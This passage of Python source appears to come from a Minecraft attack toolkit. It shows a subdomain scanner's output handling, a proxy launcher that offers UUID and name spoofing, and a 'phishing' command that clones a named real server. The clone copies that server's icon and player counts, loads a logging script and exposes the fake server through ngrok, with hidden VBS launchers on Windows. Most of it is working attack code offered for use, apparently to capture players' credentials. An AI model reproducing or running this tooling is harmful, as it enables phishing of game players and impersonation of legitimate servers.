                                                ip_subdomain = socket.gethostbyname(str(subdomain))

                                                num_subd += 1
                                                print(f"     {white}[{lgreen}√{white}] Subdomain found {lblack}» {green}{str(subdomain)} {lgreen}{str(ip_subdomain)}")
                                                logs_file.write(f"{str(subdomain)} {str(ip_subdomain)}\n")

                                            except:
                                                pass

                                    print("")

                                    if num_subd == 1:
                                        print(f"{white}     The scan ended and found {green}{str(num_subd)} {white}subdomain.")

                                    elif num_subd == 0:
                                        print(f"{white}     The scan ended and found {lred}{str(num_subd)} {white}subdomains.")

                                    else:
                                        print(f"{white}     The scan ended and found {green}{str(num_subd)} {white}subdomains.")

                                    print(f"\n     All scan data was saved in scans/subdomains/Subdomain_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt {reset}")

                                    logs_file.close()

                                except:
                                    pass

                            except:
                                print(
                                    f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid Domain")

                        except:
                            print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                    except:
                        print(f"\n     {white}[{lred}Invalid arguments{white}] {white}The file ({str(subdomains_file)}) was not found")

                except:
                    print(f"{white}\n     Usage: subd [domain] [file]")

            elif command.lower() == "bungee":
                try:
                    ip = argument[1]
                    try:
                        if os.name == "nt":
                            pass

                        else:
                            check_xterm()

                        try:
                            print(f"\n     {white}[{green}+{white}] {lgreen}Starting proxy...")

                            config_file = open("config/files/config_bungee.txt", "r")
                            yml_config = config_file.read()
                            config_file.close()

                            config_file = open("config/bungee/config.yml", "w+")
                            config_file.truncate(0)
                            config_file.write(yml_config)
                            config_file.write(f"\n    address: {str(ip)}\n")
                            config_file.write(f"    restricted: false")
                            config_file.close()

                            if os.name == "nt":
                                os.system("cd config/bungee && start iniciar.bat")

                            else:
                                os.system('cd config/bungee && xterm -T "Proxy" -e bash iniciar.sh &')

                            time.sleep(1)
                            print(f"\n     {white}[{green}+{white}] IP: {lgreen}0.0.0.0:25567")
                            print(f"\n     {white}[{green}#{white}]{white} Commands: {lyellow}\n\n     uuid <name>\n     name <name>\n     connect <server>\n     setip <ip>")

                        except Exception as message_error:
                            print(f"\n     {white}[{red}ERROR{white}] {lred}Unknown error (The error was saved in the logs)")
                            check_folder("logs")
                            error_name = "Except/bungees/try"
                            save_logs(message_error, error_name)

                    except:
                        print(f"\n     {white}[{red}-{white}] {lred}You don't have xterm installed. (Try installing it using sudo apt-get install -y xterm)")

                except:
                    print(f"{white}\n     Usage: bungee [ip:port]")

            elif command.lower() == "phishing":
                try:
                    server = argument[1].lower()
                    try:
                        if server in phishing_list:
                            pass

                        else:
                            error()

                        try:
                            check_ngrok()
                            try:
                                if os.name == "nt":
                                    pass

                                else:
                                    check_xterm()

                                try:
                                    check_connection()
                                    try:
                                        if server == "mc.universocraft.com":
                                            configplayers_directory = "config/phishing/plugins/FakePlayers/config.yml"
                                            properties_directory = "config/phishing/server.properties"
                                            data_directory = "config/phishing/plugins/Skript/logs/datos.log"
                                            ipp_file_directory = "config/phishing/ip_phishing.txt"
                                            icon_directory = "config/files/icons/universocraft.png"
                                            skript_directory = "config/files/skripts/universocraft.sk"

                                        if os.path.isfile("config/phishing/server-icon.png"):
                                            os.remove("config/phishing/server-icon.png")

                                        if os.path.isfile("config/phishing/plugins/Skript/scripts/logs.sk"):
                                            os.remove("config/phishing/plugins/Skript/scripts/logs.sk")

                                        shutil.copy(icon_directory, "config/phishing/server-icon.png")
                                        shutil.copy(skript_directory, "config/phishing/plugins/Skript/scripts/logs.sk")

                                        if os.name == "nt":
                                            command_start_server = "cd config/phishing && start iniciar.bat"
                                            command_start_console = "cd config/phishing && start python consola.py"

                                            server_properties = open("config/files/server.properties_windows", "r")
                                            config_server_properties = server_properties.read()
                                            server_properties.close()

                                            server_properties = open(properties_directory, "w+")
                                            server_properties.truncate(0)
                                            server_properties.write(config_server_properties)
                                            server_properties.close()

                                        else:
                                            command_start_server = 'cd config/phishing && xterm -T "Phishing" -e bash iniciar.sh &'
                                            command_start_console = 'cd config/phishing && xterm -T "Console" -e python3 consola.py &'

                                            server_properties = open("config/files/server.properties_linux", "r")
                                            config_server_properties = server_properties.read()
                                            server_properties.close()

                                            server_properties = open(properties_directory, "w+")
                                            server_properties.truncate(0)
                                            server_properties.write(config_server_properties)
                                            server_properties.close()

                                        try:
                                            r = requests.get(urlmcsrv + server)
                                            r_json = r.json()

                                            online_players = r_json["players"]["online"]
                                            online_players_max = r_json["players"]["max"]

                                            configplayers_file = open(configplayers_directory, "w+")
                                            configplayers_file.truncate(0)
                                            configplayers_file.write("Enabled: true \n")
                                            configplayers_file.write("Add Real Players: true \n")
                                            configplayers_file.write("Online Players: " + str(online_players) + "\n")
                                            configplayers_file.write("Max Players: " + str(online_players_max))
                                            configplayers_file.close()

                                        except:
                                            random_number = randint(1000, 8000)

                                            configplayers_file = open(configplayers_directory, "w+")
                                            configplayers_file.truncate(0)
                                            configplayers_file.write("Enabled: true \n")
                                            configplayers_file.write("Add Real Players: true \n")
                                            configplayers_file.write("Online Players: " + str(random_number) + " \n")
                                            configplayers_file.write("Max Players: 20000")
                                            configplayers_file.close()

                                        print(f"\n     {white}[{green}+{white}] {lgreen}Starting server...")

                                        os.system(command_start_server)
                                        time.sleep(3)

                                        print(f"     {white}[{green}+{white}] {lgreen}Starting ngrok...")

                                        if os.name == "nt":
                                            ngrok_background = open("taskkill.vbs", "w+")
                                            ngrok_background.truncate(0)
                                            ngrok_background.write('set objshell = createobject("wscript.shell")\nobjshell.run "taskkill /f /im ngrok.exe",vbhide')
                                            ngrok_background.close()

                                            os.system("start taskkill.vbs")

                                            ngrok_background = open("ngrok.vbs", "w+")
                                            ngrok_background.truncate(0)
                                            ngrok_background.write('set objshell = createobject("wscript.shell")\nobjshell.run "ngrok.exe tcp 25565",vbhide')
                                            ngrok_background.close()

                                            os.system("start ngrok.vbs")
                                            time.sleep(3)
                                            os.remove("ngrok.vbs")
                                            os.remove("taskkill.vbs")

                                        else:
                                            os.system('xterm -T "Ngrok" -e ./ngrok tcp 25565 &')
                                            time.sleep(3)

                                        if os.path.isfile(data_directory):
                                            phishing_data_file = open(data_directory, "w+")
                                            phishing_data_file.truncate(0)
                                            phishing_data_file.close()

                                        r = requests.get(urlngrok)
                                        r_unicode = r.content.decode("utf-8")
                                        r_json = json.loads(r_unicode)
                                        link = r_json["tunnels"][0]["public_url"]
                                        ipngrok = link.replace("tcp://", "")
                                        ipngrok = ipngrok.split(":")
                                        ipngrok2 = socket.gethostbyname(str(ipngrok[0]))
                                        ip_phishing = ipngrok2 + ":" + ipngrok[1]

                                        ipp_file = open(ipp_file_directory, "w+")
                                        ipp_file.truncate(0)
                                        ipp_file.write(str(ip_phishing))
                                        ipp_file.close()

                                        time.sleep(3)
                                        os.system(command_start_console)
                                        print(f"\n     {white}[{green}IP{white}] {lgreen}{str(ip_phishing)}")

                                    except Exception as message_error:

                                        print(f"\n     {white}[{red}ERROR{white}] {lred}Unknown error (The error was saved in the logs)")

                                        check_folder("logs")
                                        error_name = "Except/phishing/try"
                                        save_logs(message_error, error_name)

                                except:
                                    print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                            except:
                                print(f"\n     {white}[{red}-{white}] {lred}You don't have xterm installed. (Try installing it using sudo apt-get install -y xterm)")

                        except:
                            if os.name == "nt":
                                print(f"\n     {white}[{red}-{white}] {lred}The file ngrok.exe could not be found")

                            else:
                                print(f"\n     {white}[{red}-{white}] {lred}The file ngrok could not be found")

                    except:
                        print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid server")
                        print(f"     {white}Available servers: {green}{str(show_phishing_list)}")

                except:
                    print(f"{white}\n     Usage: phishing [server]")
                    print(f"     {white}Available servers: {green}{str(show_phishing_list)}")

            elif command.lower() == "discord":
                print(f"\n     My Discord server: {green}{str(discord)}")

            else:
                print(f"\n     {lblack}[{red}-{lblack}] {lred}Unknown command. Type help to see the available commands.")

        except:
            pass


if __name__ == "__main__":
    check_os()
